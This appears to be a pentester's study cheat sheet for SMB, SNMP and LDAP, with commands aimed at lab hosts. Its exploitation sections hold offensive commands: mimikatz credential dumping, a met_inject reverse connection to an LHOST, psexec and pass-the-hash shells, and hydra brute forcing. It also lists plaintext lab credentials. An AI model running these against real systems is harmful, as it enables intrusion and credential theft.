#### enum4linux
- `enum4linux $ip`
- `enum4linux -a $ip`
- `enum4linux -n $ip`
- `enum4linux -a $ip`
- `enum4linux -a -u [user] -p [passwd] $ip`

#### wireshark
- smb version and other information - 

#### smbget
- requires creds - `smbget -U edgar.jacobs -P @3ONEmillionbaby smb://10.10.11.129/RedirectedFolders$/sierra.frye/Desktop/Phishing_Attempt.xlsx`

#### cifs
> NOTE » Mounting CIFS (Common Internet File System) is nothing but a advanced SMB file system implementation which support RAP (Remote Access Protocol)
- mount shares - `mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs`
- mount share and grep for informations - `sudo mount -t cifs -o username=domainUser,domainn=domain.com //IP/SYSVOL`
- example - `mount -t cifs //10.11.1.101/Bob\ Share ./smb`
- example - `mount –t cifs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname`
- example - `mount –t cifs 192.168.0.1:/share1 /test –o username=Surendra,workgroup=test`
- example - `mount -t smbfs -o username=userid,workgroup=workgroupname,password=XXXXX //ipadd/sharepoint /mountpoint/`
- example - `mount –t smbfs –o username=Surendra,workgroup=test,password=xylBJRS8 //192.168.0.1/share1 /test`

#### smbmount
```shell
-Type1 : Listing SMB shared folder through command prompt  
[#smbclient](https://publish.obsidian.md/#smbclient) –L ipadd –U username  
Here –L will specify listing of SMB share for the server with ipadd  
Or  
[#smbclient](https://publish.obsidian.md/#smbclient) //192.168.0.1/share1 –U username

Example :  
[#smbclient](https://publish.obsidian.md/#smbclient) –L 192.168.0.1 –U root

-Type2 : Mounting SMB share on local folder by using smbmount command  
[#smbmount](https://publish.obsidian.md/#smbmount) //ipadd/sharename /mountpoint –o username=userid,workgroup=workgroupname

Example :  
[#smbmount](https://publish.obsidian.md/#smbmount) //192.168.0.1/share1 /mnt –o username=steev,workgroup=test

-Type3 : Mounting SMB share by using mount command  
[#mount](https://publish.obsidian.md/#mount) –t smbfs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname  
Or  
[#mount](https://publish.obsidian.md/#mount) –t smbfs //ipadd/sharename /mountpoint –o username=userid,workgroup=workgroupname

Example :  
[#mount](https://publish.obsidian.md/#mount) –t smbfs 192.168.0.1:/share1 /mnt –o username=surendra,workgroup=test

-Type4 : Mounting CIFS (Common Internet File System) is nothing but a advanced SMB file system implementation which support RAP (Remote Access Protocol)  
[#mount](https://publish.obsidian.md/#mount) –t cifs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname

Example :  
[#mount](https://publish.obsidian.md/#mount) –t cifs 192.168.0.1:/share1 /test –o username=Surendra,workgroup=test

-Type5 : All the above commands will ask password to display/mount the share name, however we can specify the password in command it’self as below  
[#mount](https://publish.obsidian.md/#mount) -t smbfs -o username=userid,workgroup=workgroupname,password=XXXXX //ipadd/sharepoint /mountpoint/

Example :  
[#mount](https://publish.obsidian.md/#mount) –t smbfs –o username=Surendra,workgroup=test,password=xylBJRS8 //192.168.0.1/share1 /test

-Type6 : Mounting permanently by editing /etc/fstab file, below is the fstab file entry example  
[#vi](https://publish.obsidian.md/#vi) /etc/fstab//192.168.0.1/share1 /test smbfs rw,user,username=surendra,password=xylBJRS8 0 0  
Save and exit the file and conform that you edited fstab file properly. By below commands  
[#mount](https://publish.obsidian.md/#mount) –a  
This command should not throw any error,  
[#df](https://publish.obsidian.md/#df) –H  
This command should n style="font-size: small;"> show mount from 192.168.0.1 server

-Type7 : Mounting a share where user belongs to a domain permanently by editing /etc/fstab file  
The above command will not work properly for domain users so we have to specify domain as well when specifying username  
So now username will be changed to domainusername  
[#vi](https://publish.obsidian.md/#vi) /etc/fstab  
//192.168.0.1/share1 /mnt smbfs rw,user,username=testsurendra,password=xylBJRS8 0 0  
Save the file and exit then execute mount –a and df –H for just conformation if the mount is done successfully.

-Type8: As you people know /etc/fstab file is visible to all the users who logged in, so specifying user password in /etc/fstab file is not that much good procedure.. So there is a work around to resolve this issue, just create a credential file in users home directory and point that file in /etc/fstab file entry as mention below.  

[#cd](https://publish.obsidian.md/#cd) ~  
[#echo](https://publish.obsidian.md/#echo) username=surendra > .smbfile  
[#echo](https://publish.obsidian.md/#echo) password=xylBJRS8 >> .smbfile  
[#chmod](https://publish.obsidian.md/#chmod) 600 .smbfile

Then edit the /etc/fstab file and specify the entries as below  
[#vi](https://publish.obsidian.md/#vi) /etc/fstab  

//192.168.0.1/share1 /mnt smbfs credentials=/home/myhomedirectoryofuser/. smbfile,rw,user 0 0  

Save and exit the file and execute mount –a, df –H to check if you did any mistakes..
```

#### amiga-smbfs
> https://github.com/obarthel/amiga-smbfs
- example - `mount –t smbfs 192.168.0.1:/share1 /mnt –o username=surendra,workgroup=test`

### Exploitation
#### PrivEsc | fstab
- `mount –t smbfs ipadd:/sharename /mountpoint –o username=userid,workgroup=workgroupname`
- `mount –t smbfs //ipadd/sharename /mountpoint –o username=userid,workgroup=workgroupname` 

#### PrivEsc | Crackmapexec (Using the database)
```text 
The database automatically store every hosts reaches by CME and all credentials with admin access $ cmedb 
```
- Get credentials access for a specific account - `cmedb> creds <username>`
- Using credentials from the database - `crackmapexec smb 192.168.100.1 -id <credsID>`
- Get stored credentials - `cmedb> creds`
- List stored hosts - `cmedb> hosts`
- Using workspaces - `cmedb> workspace create test` 
- Using workspaces - `cmedb> workspace test`
- Access a protocol database and switch back - `cmedb (test)> proto smb`
- Access a protocol database and switch back - `cmedb (test)> back`
- View detailed infos for a specific machine (including creds) - `cmedb> hosts <hostname>`

#### PrivEsc | Crackmapexec (Using the Modules)
- List available modules - `crackmapexec smb -L`
- Module information - `crackmapexec smb -M mimikatz --module-info`
- View module options - `crackmapexec smb -M mimikatz --options`
- Mimikatz module - `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth - M mimikatz` 
- Mimikatz module - `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz`
- Mimikatz module - `crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug`
- Met_Inject module - `crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444`
- Metasploit MODULE - set up a HTTP Reverse Handler - `msf > use exploit/multi/handler  msf exploit(handler) > set payload windows/meterpreter/reverse_https msf exploit(handler) > set LHOST 192.168.10.3 msf exploit(handler) > set exitonsession false msf exploit(handler) > exploit -j` 

#### PrivEsc | Impacket SMB/MSRPC tools
```text

- lookupsids → SID Bruteforce through MSRPC Interface

-  samrdump → SAM Remote Interface (MSRPC) to extract system users, available share etc.
    python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip
        - services → Used to (start, stop, delete, status, config, list, create, change) services through MSRPC interface

- netview → Get a list of opened sessions and keep tracks of who logged in/off from remote targets

- rpcdump → This script will dump the list of RPC endpoints and string bindings registered at the target.

- Dump Users
    impacket-rpcdump $ip

reg → Remote registry manipulation tool through the [MS-RRP] MSRPC Interface.

tool.py domain\user:password@IP <command/parameter> testparm
    `systemd` generates mount units based on this file: `systemd.mount(5)`
    NOTE: run 'systemctl daemon-reload' after making changes here.
```

#### PrivEsc | BASH SCRIPT TO ESTABLISH A NULL SESSION:
```text
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
    output=$(smbclient -U '%' -N \\\\$ip\\$share -c '') 

    if [[ -z $output ]]; then 
        echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
    else
        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
    fi
done
```

#### nulllinux
- `python3 nullinux.py -a 10.11.1.120`

#### msf
```text
msf > use auxiliary/admin/smb/samba_symlink_traversal
msf auxiliary(samba_symlink_traversal) > show actions
    ...actions...
msf auxiliary(samba_symlink_traversal) > set ACTION < action-name >
msf auxiliary(samba_symlink_traversal) > show options
    ...show and set options...
msf auxiliary(samba_symlink_traversal) > run
```

#### Pop a shell
- `psexec.py '<username>:<password>@$ip'`
- `wmiexec.py '<username>:<password>@$ip'`
- `winexe -U '<username>%<password>' //$ip cmd.exe`
- `pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //$ip cmd.exe`

#### SMB Exploitation | Default Creds
```text
Try default creds 
    admin/admin, administrator/administrator, test/test, user/user, etc.,
```

#### SMB Exploitation | Brute Force with HYDRA
- `hydra -l root -P /usr/share/wordlists/rockyou.txt $ip smb -V`

#### SMB Exploitation | Common Exploits
```text
MS08-067 (windows) - https://www.exploit-db.com/exploits/40279/
Samba 2.2.7a (Linux) - https://www.exploit-db.com/exploits/10/
EternalBlue (windows) - https://www.exploit-db.com/exploits/42315
MS14-025
```

#### SMB Exploitation | gpp-decrypt password
```text
The following tool allows decryption

https://github.com/lucasko/gpp-encrypt-decrypt
    If you ever need to recreate this vulnerability

 You can encrypt a password using the following:
    https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Hex','string':'4e9906e8fcb66cc9faf49310620ffee8f49

```



#### SMB Exploitation | Mounting permanently by editing /etc/fstab file
```text
fstab file entry example
    vi /etc/fstab//192.168.0.1/share1 /test smbfs rw,user,username=surendra,password=xylBJRS8 0 0

    Save and exit the file and confirm that you edited fstab file properly. By below commands
    mount –a

This command should not throw any error,
    df –H
    This command should show mount from $LHOST server
```

#### SMB Exploitation | Mounting a share where user belongs to a domain permanently by editing /etc/fstab file
```text
The above command will not work properly for domain users so we have to specify domain as well when specifying username
> NOTE: username will be changed to domainusername

1. 
    vi /etc/fstab
    //192.168.0.1/share1 /mnt smbfs rw,user,username=testsurendra,password=xylBJRS8 0 0

2. Save the file and exit then execute `mount –a and df –H` for just conformation if the mount is done successfully.

NOTE:  `/etc/fstab` file is visible to all the users who have logged in, so specifying user password in /etc/fstab file is not recommended. Instead, create a `credential file` in users home directory and point that file to  the `/etc/fstab` file entry as mention below.

	cd ~
	echo username=surendra > .smbfile
	echo password=xylBJRS8 >> .smbfile
	chmod 600 .smbfile

3. edit the `/etc/fstab` file and specify the entries as below

	vi /etc/fstab
	//192.168.0.1/share1 /mnt smbfs credentials=/home/myhomedirectoryofuser/. smbfile,rw,user 0 0

4. Save and exit the file and execute 
	mount –a, df –H to check if you did any mistakes.
```

#### psexec - Exploit SMB
- gain access - `python psexec.py sqlServer:shantewhite@10.11.1.123 `
- gain access - `python psexec.py daisy:XorPasswordIsDead17@10.11.1.122`

#### Defend / Protect SMB
```text
You can list active SMB sessions
    C:> net session

And kill them
    C:> net session [LinuxIPaddr] /del
```













## 161 » SNMP
### Enumeration
#### nmap
- `nmap --script snmp-info,snmp-brute,snmp-interfaces,snmp-processes,snmp-win32-users,snmp-win32-software,snmp-win32-shares,snmp-win32services <victim_ip> -p161` 
#### netcat 
- `nc $IP 161`

#### telnet 
- `telnet $IP 161`

#### snmp enumeration commands
```text
NOTE: Fix SNMP output values so they are human readable
 
	apt-get install snmp-mibs-downloader download-mibs

	echo "" > /etc/snmp/snmp.conf
```
- `snmpcheck -t $ip -c public`
- `snmpwalk -c public -v1 $ip 1|`
- `snmpwalk -c public -v1 10.0.0.0`
- `grep hrSWRunName|cut -d\* \* -f`
- `snmpenum -t $ip`
- `onesixtyone -c names -i hosts`
- `snmpenum -t 192.168.1.X`

#### snmp enumeration commands | snmpwalk
- Enumerating the Entire MIB Tree - `snmpwalk -c public -v1 10.11.1.72`
- Enumerating Windows Users - `snmpwalk -c public -v1 10.11.1.72 1.3.6.1.4.1.77.1.2.25`
- Enumerating Running Windows Processes - `snmpwalk -c public -v1 10.11.1.72 1.3.6.1.2.1.25.4.2.1.2`
- Enumerating Open TCP Ports - `snmpwalk -c public -v1 10.11.1.72 1.3.6.1.2.1.6.13.1.3`
- Enumerating Installed Software - `snmpwalk -c public -v1 10.11.1.72 1.3.6.1.2.1.25.6.3.1.2`

#### SNMPv3 Enumeration
##### nmap
- `nmap -sV -p 161 --script=snmp-info $ip/24`
- `nmap -sT -p 161 192.168.X.X -oG snmp_results.txt`

##### Automate the username enumeration process for SNMPv3
- `apt-get install snmp snmp-mibs-downloader`
- `wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`

##### SNMP Default Credentials
- `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`

#### Quick test of communities | onesixtyone
- `onesixtyone <victim_ip> -c`

#### Full discovery of everything you can | snmpwalk
`snmpwalk -c public -v1 <victim_ip> #community string and which version`

```text
# MIB-Management Information Base codes

1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
```

### Exploitation:
```text
Check exploit-db.com for the latest exploits
```

## 389 & 636 LDAP
### Enumeration
#### ldapsearch (Unauthenticated)
- `ldapsearch -h $RHOST -x -s base namingcontexts`
- `ldapsearch -h $RHOST -x -b "DC=search,DC=htb"`

#### ldapsearch (Authenticated)
- `ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w "IsolationIsKey?" -b "DC=search,DC=htb"`

#### ldapdomaindump - Visualize LDAP data  
- `ldapdomaindump -u search.htb\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o ldap/`
- `ls ldap/`

#### kerbrute
- `kerbrute userenum --dc $RHOST -d search.htb users.txt`

### Exploitation



## PORT » SERVICE
### Enumeration
### Exploitation
